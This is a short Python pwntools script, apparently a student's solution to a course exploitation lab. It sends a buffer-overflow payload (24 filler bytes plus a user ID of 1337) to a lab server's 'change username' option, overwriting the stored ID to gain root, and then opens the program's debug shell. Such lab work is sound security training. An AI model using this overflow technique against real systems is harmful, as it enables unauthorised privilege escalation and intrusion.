from pwn import *


ROOT_ID = b'\x00\x00\x00\x00\x39\x05\x00'
#ROOT_ID = 1337

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7032)          # Test Script Against Server
# p = process("./3-2_lab.bin")                  # Uncomment to Test Script Locally
# p = gdb.debug("./3-2_lab.bin")                # Uncomment to debug GDB

# prepare payload and overwrite the stack

p.sendline(b'1') #select option (1) Change username

#payload format (buffer + user id )
#payload = b"A"*24 + b"\x00"*4+p32(ROOT_ID) 
payload = b"A"*24 + ROOT_ID

p.sendline(payload)       # Send the payload
p.sendline(b'3') #select option (3) Start a debug shell

# Start Interactive Session
p.interactive()



